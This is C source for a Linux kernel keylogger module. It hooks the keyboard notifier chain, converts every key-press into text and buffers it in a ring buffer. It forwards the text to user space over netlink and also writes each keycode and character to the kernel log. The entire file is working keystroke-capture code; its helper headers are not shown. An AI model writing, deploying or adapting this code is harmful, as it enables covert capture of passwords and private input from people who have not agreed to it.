#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/slab.h>
#include "keylogger.h"
#include "keymap.h"
#include "ringbuf.h"
#include "netlink_comm.h"

static struct notifier_block keylogger_nb;
static struct ring_buffer *kbd_buffer;

static int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;
    char tmp[16];
    size_t len;

    printk(KERN_INFO "Keylogger: Event received - keycode: %d, down: %d, shift: %d\n", 
           param->value, param->down, param->shift);

    if (!param->down)
        return NOTIFY_OK;

    len = keycode_to_us_string(param->value, param->shift, tmp, sizeof(tmp));
    printk(KERN_INFO "Keylogger: Converted to string: '%s' (len: %zu)\n", tmp, len);
    
    if (len > 0 && !ringbuf_write(kbd_buffer, tmp, len)) {
        printk(KERN_INFO "Keylogger: Sending data to user space\n");
        netlink_send(tmp, len);
    }

    return NOTIFY_OK;
}

int keylogger_init(void) {
    printk(KERN_INFO "Keylogger: Initializing...\n");
    
    kbd_buffer = ringbuf_create(1024);
    if (!kbd_buffer) {
        printk(KERN_ERR "Keylogger: Failed to create ring buffer\n");
        return -ENOMEM;
    }

    keylogger_nb.notifier_call = keylogger_cb;
    int ret = register_keyboard_notifier(&keylogger_nb);
    if (ret < 0) {
        printk(KERN_ERR "Keylogger: Failed to register keyboard notifier\n");
        ringbuf_free(kbd_buffer);
        return ret;
    }
    
    printk(KERN_INFO "Keylogger: Successfully initialized\n");
    return 0;
}

void keylogger_exit(void) {
    printk(KERN_INFO "Keylogger: Exiting...\n");
    unregister_keyboard_notifier(&keylogger_nb);
    ringbuf_free(kbd_buffer);
}
